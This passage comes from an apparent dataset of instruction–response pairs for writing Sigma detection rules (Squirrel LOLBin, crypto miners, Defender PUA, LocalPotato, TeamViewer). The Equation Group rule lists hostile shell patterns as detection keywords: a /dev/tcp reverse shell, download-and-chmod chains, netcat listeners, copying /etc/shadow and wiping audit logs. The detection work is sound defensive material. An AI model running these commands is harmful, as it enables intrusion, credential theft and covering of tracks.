    "instruction": "Build a Sigma rule with the goal of detecting Possible Squirrel Packages Manager as Lolbin.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible Squirrel Packages Manager as Lolbin, you should monitor process creation events on Windows systems for executions of \"update.exe\". Specifically, look for command line arguments that include '--processStart', '--processStartAndWait', or '--createShortcut'. However, it's important to exclude legitimate update activity by applications like Discord, GitHub Desktop, and Microsoft Teams, which commonly use these command line arguments in their update mechanisms. This involves filtering out any command line executions of 'update.exe' located in user-specific AppData folders for Discord, GitHubDesktop, and Teams, especially when accompanied by expected application-specific arguments like launching or creating shortcuts for those applications. Recognize that despite the utility of this monitoring, there will be a range of legitimate software updates (e.g., 1Clipboard, Beaker Browser, Figma, Slack) that may also trigger these detections, so they should be considered as potential false positives and investigated accordingly. This approach aims at a medium level of alert severity due to its potential to flag legitimate update processes alongside malicious usage of the Squirrel package manager as a Living-off-the-land binary (Lolbin).",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\update.exe'\n    selection2:\n        CommandLine|contains:\n            - '--processStart'\n            - '--processStartAndWait'\n            - '--createShortcut'\n    filter_discord:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\Discord\\Update.exe'\n            - ' --processStart'\n            - 'Discord.exe'\n    filter_github_desktop:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\GitHubDesktop\\Update.exe'\n            - 'GitHubDesktop.exe'\n        CommandLine|contains:\n            - '--createShortcut'\n            - '--processStartAndWait'\n    filter_teams:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\Teams\\Update.exe'\n            - 'Teams.exe'\n        CommandLine|contains:\n            - '--processStart'\n            - '--createShortcut'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - 1Clipboard\n    - Beaker Browser\n    - Caret\n    - Collectie\n    - Discord\n    - Figma\n    - Flow\n    - Ghost\n    - GitHub Desktop\n    - GitKraken\n    - Hyper\n    - Insomnia\n    - JIBO\n    - Kap\n    - Kitematic\n    - Now Desktop\n    - Postman\n    - PostmanCanary\n    - Rambox\n    - Simplenote\n    - Skype\n    - Slack\n    - SourceTree\n    - Stride\n    - Svgsus\n    - WebTorrent\n    - WhatsApp\n    - WordPress.com\n    - Atom\n    - Gitkraken\n    - Slack\n    - Teams\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\update.exe'\n    selection2:\n        CommandLine|contains:\n            - '--processStart'\n            - '--processStartAndWait'\n            - '--createShortcut'\n    filter_discord:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\Discord\\Update.exe'\n            - ' --processStart'\n            - 'Discord.exe'\n    filter_github_desktop:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\GitHubDesktop\\Update.exe'\n            - 'GitHubDesktop.exe'\n        CommandLine|contains:\n            - '--createShortcut'\n            - '--processStartAndWait'\n    filter_teams:\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\Teams\\Update.exe'\n            - 'Teams.exe'\n        CommandLine|contains:\n            - '--processStart'\n            - '--createShortcut'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - 1Clipboard\n    - Beaker Browser\n    - Caret\n    - Collectie\n    - Discord\n    - Figma\n    - Flow\n    - Ghost\n    - GitHub Desktop\n    - GitKraken\n    - Hyper\n    - Insomnia\n    - JIBO\n    - Kap\n    - Kitematic\n    - Now Desktop\n    - Postman\n    - PostmanCanary\n    - Rambox\n    - Simplenote\n    - Skype\n    - Slack\n    - SourceTree\n    - Stride\n    - Svgsus\n    - WebTorrent\n    - WhatsApp\n    - WordPress.com\n    - Atom\n    - Gitkraken\n    - Slack\n    - Teams\nlevel: medium\n",
      "question": "Possible Squirrel Packages Manager as Lolbin",
      "answer": "In order to detect possible Squirrel Packages Manager as Lolbin, you should monitor process creation events on Windows systems for executions of \"update.exe\". Specifically, look for command line arguments that include '--processStart', '--processStartAndWait', or '--createShortcut'. However, it's important to exclude legitimate update activity by applications like Discord, GitHub Desktop, and Microsoft Teams, which commonly use these command line arguments in their update mechanisms. This involves filtering out any command line executions of 'update.exe' located in user-specific AppData folders for Discord, GitHubDesktop, and Teams, especially when accompanied by expected application-specific arguments like launching or creating shortcuts for those applications. Recognize that despite the utility of this monitoring, there will be a range of legitimate software updates (e.g., 1Clipboard, Beaker Browser, Figma, Slack) that may also trigger these detections, so they should be considered as potential false positives and investigated accordingly. This approach aims at a medium level of alert severity due to its potential to flag legitimate update processes alongside malicious usage of the Squirrel package manager as a Living-off-the-land binary (Lolbin)."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may abuse the Windows command shell for execution.\nThe Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.\nThe Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.\nCommon uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries abusing the Windows command shell for execution, you should monitor PowerShell Script Block Logs for specific patterns indicating malicious activity. Ensure that Script Block Logging is enabled on Windows systems to capture detailed information about all PowerShell scripts executed, including those launched from the command line. Focus on identifying any instances where the PowerShell script contains commands starting processes (Start-Process) directly followed by or associated with execution of batch files (files ending in .cmd or .bat). These patterns are indicative of attempts to control the system or execute tasks in a manner commonly seen in attacks leveraging the command shell. Note that while detecting these behaviors is crucial for identifying potential malicious activity, it\u2019s also important to consider legitimate administrative scripts that may employ similar commands for system management purposes. The detection is tagged with tactics and techniques such as Execution and Command and Scripting Interpreter, reflecting its focus on capturing misuse of the Windows command shell and batch files for adversarial purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_start:\n        ScriptBlockText|contains: Start-Process\n    selection_batch:\n        ScriptBlockText|contains:\n            - '.cmd'\n            - '.bat'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_start:\n        ScriptBlockText|contains: Start-Process\n    selection_batch:\n        ScriptBlockText|contains:\n            - '.cmd'\n            - '.bat'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration script\nlevel: medium\n",
      "question": "Adversaries may abuse the Windows command shell for execution.\nThe Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.\nThe Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.\nCommon uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system\n",
      "answer": "In order to detect adversaries abusing the Windows command shell for execution, you should monitor PowerShell Script Block Logs for specific patterns indicating malicious activity. Ensure that Script Block Logging is enabled on Windows systems to capture detailed information about all PowerShell scripts executed, including those launched from the command line. Focus on identifying any instances where the PowerShell script contains commands starting processes (Start-Process) directly followed by or associated with execution of batch files (files ending in .cmd or .bat). These patterns are indicative of attempts to control the system or execute tasks in a manner commonly seen in attacks leveraging the command shell. Note that while detecting these behaviors is crucial for identifying potential malicious activity, it\u2019s also important to consider legitimate administrative scripts that may employ similar commands for system management purposes. The detection is tagged with tactics and techniques such as Execution and Command and Scripting Interpreter, reflecting its focus on capturing misuse of the Windows command shell and batch files for adversarial purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting command line parameters or strings often used by crypto miners.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect command line parameters or strings often used by crypto miners, you should focus on monitoring process creation events on Windows systems. Specifically, look for command line inputs that contain key indicators of cryptocurrency mining, such as setting the CPU priority, opting out of donation levels, specifying mining pool addresses, choosing mining algorithms, and connecting over specific protocols like TCP and UDP. Notable strings to watch for include ' --cpu-priority=', '--donate-level=0', ' -o pool.', ' --nicehash', ' --algo=rx/0 ', 'stratum+tcp://', and 'stratum+udp://'. Additionally, attention should be paid to the base64 encoded versions of '--donate-level=' and pool connection strings like 'stratum+tcp://' and 'stratum+udp://', which miners might use to obfuscate their activities.\n\nExclude detections that might come from legitimate use cases, especially where command lines involve common strings seen in legitimate scripts or applications, such as ' pool.c ', ' pool.o ', or when using the 'gcc -' compiler command, as these could represent legitimate development activities or use of mining software for authorized purposes. \n\nThis approach targets high-level indicators of mining activity through command line analysis, under the assumption that crypto mining operations will utilize specific parameters and protocols to optimize their mining efforts and connect to mining pools. Tags associated with this detection tactic include Resource Development, Command and Control, and Execution, specifically pertaining to techniques like User Execution and Command and Scripting Interpreter use. Awareness and monitoring of these indicators are crucial in identifying unauthorized cryptocurrency mining activities, which might otherwise go unnoticed and could lead to resource exploitation, increased costs, and potential security vulnerabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' --cpu-priority='\n            - '--donate-level=0'\n            - ' -o pool.'\n            - ' --nicehash'\n            - ' --algo=rx/0 '\n            - 'stratum+tcp://'\n            - 'stratum+udp://'\n            # base64 encoded: --donate-level=\n            - 'LS1kb25hdGUtbGV2ZWw9'\n            - '0tZG9uYXRlLWxldmVsP'\n            - 'tLWRvbmF0ZS1sZXZlbD'\n            # base64 encoded: stratum+tcp:// and stratum+udp://\n            - 'c3RyYXR1bSt0Y3A6Ly'\n            - 'N0cmF0dW0rdGNwOi8v'\n            - 'zdHJhdHVtK3RjcDovL'\n            - 'c3RyYXR1bSt1ZHA6Ly'\n            - 'N0cmF0dW0rdWRwOi8v'\n            - 'zdHJhdHVtK3VkcDovL'\n    filter:\n        CommandLine|contains:\n            - ' pool.c '\n            - ' pool.o '\n            - 'gcc -'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of crypto miners\n    - Some build frameworks\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' --cpu-priority='\n            - '--donate-level=0'\n            - ' -o pool.'\n            - ' --nicehash'\n            - ' --algo=rx/0 '\n            - 'stratum+tcp://'\n            - 'stratum+udp://'\n            # base64 encoded: --donate-level=\n            - 'LS1kb25hdGUtbGV2ZWw9'\n            - '0tZG9uYXRlLWxldmVsP'\n            - 'tLWRvbmF0ZS1sZXZlbD'\n            # base64 encoded: stratum+tcp:// and stratum+udp://\n            - 'c3RyYXR1bSt0Y3A6Ly'\n            - 'N0cmF0dW0rdGNwOi8v'\n            - 'zdHJhdHVtK3RjcDovL'\n            - 'c3RyYXR1bSt1ZHA6Ly'\n            - 'N0cmF0dW0rdWRwOi8v'\n            - 'zdHJhdHVtK3VkcDovL'\n    filter:\n        CommandLine|contains:\n            - ' pool.c '\n            - ' pool.o '\n            - 'gcc -'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of crypto miners\n    - Some build frameworks\nlevel: high\n",
      "question": "command line parameters or strings often used by crypto miners",
      "answer": "In order to detect command line parameters or strings often used by crypto miners, you should focus on monitoring process creation events on Windows systems. Specifically, look for command line inputs that contain key indicators of cryptocurrency mining, such as setting the CPU priority, opting out of donation levels, specifying mining pool addresses, choosing mining algorithms, and connecting over specific protocols like TCP and UDP. Notable strings to watch for include ' --cpu-priority=', '--donate-level=0', ' -o pool.', ' --nicehash', ' --algo=rx/0 ', 'stratum+tcp://', and 'stratum+udp://'. Additionally, attention should be paid to the base64 encoded versions of '--donate-level=' and pool connection strings like 'stratum+tcp://' and 'stratum+udp://', which miners might use to obfuscate their activities.\n\nExclude detections that might come from legitimate use cases, especially where command lines involve common strings seen in legitimate scripts or applications, such as ' pool.c ', ' pool.o ', or when using the 'gcc -' compiler command, as these could represent legitimate development activities or use of mining software for authorized purposes. \n\nThis approach targets high-level indicators of mining activity through command line analysis, under the assumption that crypto mining operations will utilize specific parameters and protocols to optimize their mining efforts and connect to mining pools. Tags associated with this detection tactic include Resource Development, Command and Control, and Execution, specifically pertaining to techniques like User Execution and Command and Scripting Interpreter use. Awareness and monitoring of these indicators are crucial in identifying unauthorized cryptocurrency mining activities, which might otherwise go unnoticed and could lead to resource exploitation, increased costs, and potential security vulnerabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling Windows Defender PUA protection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'\n        Details: 'DWORD (0x00000000)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "disabling Windows Defender PUA protection",
      "answer": "In order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious shell commands used in various Equation Group scripts and tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious shell commands used in various Equation Group scripts and tools, you should: Focus on monitoring Linux systems for specific command patterns that are indicative of malicious activity. These patterns include changing ownership to root and modifying file permissions to make them executable by anyone (e.g., using `chown root*chmod 4777`), copying the shell binary and changing its ownership (`cp /bin/sh .;chown`), modifying permissions and ownership in a temporary directory, especially involving suspiciously named binaries (like `/tmp/.scsi/dev/bin/gsh`), and employing unusual telnet commands to redirect console output to a shell or to set up reverse shells (e.g., `/bin/telnet locip locport < /dev/console | /bin/sh`). Look for the use of tools or scripts named or resembling Equation Group tools, such as `ewok`, `xspy`, `ghost_`, and attempts to wipe or hide network presence (`--wipe > /dev/null`) or manipulate system logs (clearing `/var/log/audit/audit.log`). Monitoring should also include spotting attempts to open backdoors or gain persistent access through modified file permissions on essential utilities or by downloading and executing files with permissions changes (e.g., `wget http*; chmod +x /tmp/sendmail`). It is crucial to watch for these commands in the Linux environment as their execution may indicate an attacker's attempt to establish persistence, escalate privileges, execute arbitrary commands, or exfiltrate data. While some commands might have legitimate uses, their context or combination can signal malicious intent, highlighting the importance of context-aware monitoring to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        # evolvingstrategy, elgingamble, estesfox\n        - 'chown root*chmod 4777 '\n        - 'cp /bin/sh .;chown'\n        # tmpwatch\n        - 'chmod 4777 /tmp/.scsi/dev/bin/gsh'\n        - 'chown root:root /tmp/.scsi/dev/bin/'\n        # estesfox\n        - 'chown root:root x;'\n        # ratload\n        - '/bin/telnet locip locport < /dev/console | /bin/sh'\n        - '/tmp/ratload'\n        # ewok\n        - 'ewok -t '\n        # xspy\n        - 'xspy -display '\n        # elatedmonkey\n        - 'cat > /dev/tcp/127.0.0.1/80 <<END'\n        # ftshell\n        - 'rm -f /current/tmp/ftshell.latest'\n        # ghost\n        - 'ghost_* -v '\n        # morerats client\n        - ' --wipe > /dev/null'\n        # noclient\n        - 'ping -c 2 *; grep * /proc/net/arp >/tmp/gx'\n        - 'iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;'\n        # auditcleaner\n        - '> /var/log/audit/audit.log; rm -f .'\n        - 'cp /var/log/audit/audit.log .tmp'\n        # reverse shell\n        - 'sh >/dev/tcp/* <&1 2>&1'\n        # packrat\n        - 'ncat -vv -l -p * <'\n        - 'nc -vv -l -p * <'\n        # empty bowl\n        - '< /dev/console | uudecode && uncompress'\n        - 'sendmail -osendmail;chmod +x sendmail'\n        # echowrecker\n        - '/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron'\n        # dubmoat\n        - 'chmod 666 /var/run/utmp~'\n        # poptop\n        - 'chmod 700 nscd crond'\n        # abopscript\n        - 'cp /etc/shadow /tmp/.'\n        # ys\n        - '</dev/console |uudecode > /dev/null 2>&1 && uncompress'\n        # jacktelnet\n        - 'chmod 700 jp&&netstat -an|grep'\n        # others\n        - 'uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755'\n        - 'chmod 700 crond'\n        - 'wget http*; chmod +x /tmp/sendmail'\n        - 'chmod 700 fp sendmail pt'\n        - 'chmod 755 /usr/vmsys/bin/pipe'\n        - 'chmod -R 755 /usr/vmsys'\n        - 'chmod 755 $opbin/*tunnel'\n        - 'chmod 700 sendmail'\n        - 'chmod 0700 sendmail'\n        - '/usr/bin/wget http*sendmail;chmod +x sendmail;'\n        - '&& telnet * 2>&1 </dev/console'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        # evolvingstrategy, elgingamble, estesfox\n        - 'chown root*chmod 4777 '\n        - 'cp /bin/sh .;chown'\n        # tmpwatch\n        - 'chmod 4777 /tmp/.scsi/dev/bin/gsh'\n        - 'chown root:root /tmp/.scsi/dev/bin/'\n        # estesfox\n        - 'chown root:root x;'\n        # ratload\n        - '/bin/telnet locip locport < /dev/console | /bin/sh'\n        - '/tmp/ratload'\n        # ewok\n        - 'ewok -t '\n        # xspy\n        - 'xspy -display '\n        # elatedmonkey\n        - 'cat > /dev/tcp/127.0.0.1/80 <<END'\n        # ftshell\n        - 'rm -f /current/tmp/ftshell.latest'\n        # ghost\n        - 'ghost_* -v '\n        # morerats client\n        - ' --wipe > /dev/null'\n        # noclient\n        - 'ping -c 2 *; grep * /proc/net/arp >/tmp/gx'\n        - 'iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;'\n        # auditcleaner\n        - '> /var/log/audit/audit.log; rm -f .'\n        - 'cp /var/log/audit/audit.log .tmp'\n        # reverse shell\n        - 'sh >/dev/tcp/* <&1 2>&1'\n        # packrat\n        - 'ncat -vv -l -p * <'\n        - 'nc -vv -l -p * <'\n        # empty bowl\n        - '< /dev/console | uudecode && uncompress'\n        - 'sendmail -osendmail;chmod +x sendmail'\n        # echowrecker\n        - '/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron'\n        # dubmoat\n        - 'chmod 666 /var/run/utmp~'\n        # poptop\n        - 'chmod 700 nscd crond'\n        # abopscript\n        - 'cp /etc/shadow /tmp/.'\n        # ys\n        - '</dev/console |uudecode > /dev/null 2>&1 && uncompress'\n        # jacktelnet\n        - 'chmod 700 jp&&netstat -an|grep'\n        # others\n        - 'uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755'\n        - 'chmod 700 crond'\n        - 'wget http*; chmod +x /tmp/sendmail'\n        - 'chmod 700 fp sendmail pt'\n        - 'chmod 755 /usr/vmsys/bin/pipe'\n        - 'chmod -R 755 /usr/vmsys'\n        - 'chmod 755 $opbin/*tunnel'\n        - 'chmod 700 sendmail'\n        - 'chmod 0700 sendmail'\n        - '/usr/bin/wget http*sendmail;chmod +x sendmail;'\n        - '&& telnet * 2>&1 </dev/console'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious shell commands used in various Equation Group scripts and tools",
      "answer": "In order to detect suspicious shell commands used in various Equation Group scripts and tools, you should: Focus on monitoring Linux systems for specific command patterns that are indicative of malicious activity. These patterns include changing ownership to root and modifying file permissions to make them executable by anyone (e.g., using `chown root*chmod 4777`), copying the shell binary and changing its ownership (`cp /bin/sh .;chown`), modifying permissions and ownership in a temporary directory, especially involving suspiciously named binaries (like `/tmp/.scsi/dev/bin/gsh`), and employing unusual telnet commands to redirect console output to a shell or to set up reverse shells (e.g., `/bin/telnet locip locport < /dev/console | /bin/sh`). Look for the use of tools or scripts named or resembling Equation Group tools, such as `ewok`, `xspy`, `ghost_`, and attempts to wipe or hide network presence (`--wipe > /dev/null`) or manipulate system logs (clearing `/var/log/audit/audit.log`). Monitoring should also include spotting attempts to open backdoors or gain persistent access through modified file permissions on essential utilities or by downloading and executing files with permissions changes (e.g., `wget http*; chmod +x /tmp/sendmail`). It is crucial to watch for these commands in the Linux environment as their execution may indicate an attacker's attempt to establish persistence, escalate privileges, execute arbitrary commands, or exfiltrate data. While some commands might have legitimate uses, their context or combination can signal malicious intent, highlighting the importance of context-aware monitoring to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the LocalPotato POC based on basic PE metadata information and default CLI examples.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the LocalPotato Proof of Concept (POC) based on basic Portable Executable (PE) metadata information and default Command Line Interface (CLI) examples, you should monitor for the creation of processes on Windows systems where the executable involved ends with '\\LocalPotato.exe'. Additionally, detect if the command line used for executing the process contains specific parameters, including both '.exe -i C:\\' and '-o Windows\\' in any order. The detection should also encompass checking for known malicious hashes, specifically IMPHASH values of 'E1742EE971D6549E8D4D81115F88F1FC' and 'DD82066EFBA94D7556EF582F247C8BB5', which could be present either directly within the process hash properties or as an Import Hash (Imphash) metadata attribute. Given the specificity of these indicators and the context in which this detection operates, it is considered unlikely to generate false positives and is treated with a high level of severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\LocalPotato.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '.exe -i C:\\'\n            - '-o Windows\\'\n    selection_hash_plain:\n        Hashes|contains:\n            - 'IMPHASH=E1742EE971D6549E8D4D81115F88F1FC'\n            - 'IMPHASH=DD82066EFBA94D7556EF582F247C8BB5'\n    selection_hash_ext:\n        Imphash:\n            - 'E1742EE971D6549E8D4D81115F88F1FC'\n            - 'DD82066EFBA94D7556EF582F247C8BB5'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\LocalPotato.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '.exe -i C:\\'\n            - '-o Windows\\'\n    selection_hash_plain:\n        Hashes|contains:\n            - 'IMPHASH=E1742EE971D6549E8D4D81115F88F1FC'\n            - 'IMPHASH=DD82066EFBA94D7556EF582F247C8BB5'\n    selection_hash_ext:\n        Imphash:\n            - 'E1742EE971D6549E8D4D81115F88F1FC'\n            - 'DD82066EFBA94D7556EF582F247C8BB5'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of the LocalPotato POC based on basic PE metadata information and default CLI examples",
      "answer": "In order to detect the execution of the LocalPotato Proof of Concept (POC) based on basic Portable Executable (PE) metadata information and default Command Line Interface (CLI) examples, you should monitor for the creation of processes on Windows systems where the executable involved ends with '\\LocalPotato.exe'. Additionally, detect if the command line used for executing the process contains specific parameters, including both '.exe -i C:\\' and '-o Windows\\' in any order. The detection should also encompass checking for known malicious hashes, specifically IMPHASH values of 'E1742EE971D6549E8D4D81115F88F1FC' and 'DD82066EFBA94D7556EF582F247C8BB5', which could be present either directly within the process hash properties or as an Import Hash (Imphash) metadata attribute. Given the specificity of these indicators and the context in which this detection operates, it is considered unlikely to generate false positives and is treated with a high level of severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of log files during a TeamViewer remote session.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of log files during a TeamViewer remote session, you should: focus on monitoring Windows file event logs for the creation of specific TeamViewer log files. This involves tracking instances where files ending with '\\TeamViewer\\RemotePrinting\\tvprint.db' or '\\TeamViewer\\TVNetwork.log' are created. Additionally, it's important to look for file creations containing the path '\\TeamViewer' combined with the file name component '_Logfile.log'. This approach aims to identify potentially unauthorized or malicious use of TeamViewer by spotting the creation of these distinctive log files, which could indicate a remote session. However, it's also crucial to consider the context of these detections as legitimate use of TeamViewer within an organization can lead to similar log file creations, which would be considered false positives in this security monitoring scenario. The sensitivity level for this detection is set to medium, acknowledging the balance between detecting potential threats and minimizing the impact of false-positive alerts on organizational operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection1:\n        TargetFilename|endswith:\n            - '\\TeamViewer\\RemotePrinting\\tvprint.db'\n            - '\\TeamViewer\\TVNetwork.log'\n    selection2:\n        TargetFilename|contains|all:\n            - '\\TeamViewer'\n            - '_Logfile.log'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate uses of TeamViewer in an organisation\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection1:\n        TargetFilename|endswith:\n            - '\\TeamViewer\\RemotePrinting\\tvprint.db'\n            - '\\TeamViewer\\TVNetwork.log'\n    selection2:\n        TargetFilename|contains|all:\n            - '\\TeamViewer'\n            - '_Logfile.log'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate uses of TeamViewer in an organisation\nlevel: medium\n",
      "question": "creation of log files during a TeamViewer remote session",
      "answer": "In order to detect the creation of log files during a TeamViewer remote session, you should: focus on monitoring Windows file event logs for the creation of specific TeamViewer log files. This involves tracking instances where files ending with '\\TeamViewer\\RemotePrinting\\tvprint.db' or '\\TeamViewer\\TVNetwork.log' are created. Additionally, it's important to look for file creations containing the path '\\TeamViewer' combined with the file name component '_Logfile.log'. This approach aims to identify potentially unauthorized or malicious use of TeamViewer by spotting the creation of these distinctive log files, which could indicate a remote session. However, it's also crucial to consider the context of these detections as legitimate use of TeamViewer within an organization can lead to similar log file creations, which would be considered false positives in this security monitoring scenario. The sensitivity level for this detection is set to medium, acknowledging the balance between detecting potential threats and minimizing the impact of false-positive alerts on organizational operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk, often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations, you should monitor for process creation events in Windows environments, specifically focusing on instances where command-line tools like cmd.exe, PowerShell (powershell.exe or pwsh.exe), robocopy.exe, or xcopy.exe are invoked. These tools should be scrutinized when they include commands indicative of a file copy operation (e.g., \"copy \", \"copy-item\", \"cpi \", \"cp \") especially when the target or destination of the copy involves critical system directories like System32 or SysWOW64. It's important to pay particular attention to the command line used in these operations, recording both the command issued and, if available, the parent command line that initiated the process. However, it's also necessary to be aware of legitimate administrative scripts and direct calls to copying utilities that may trigger false positives, so the context of each detection must be evaluated against known benign activities in the monitored environment. This methodology is designed to uncover tactics and techniques potentially indicative of attempts to evade simple path-based detection mechanisms by relocating system tools to less scrutinized directories.",
    "context": "",
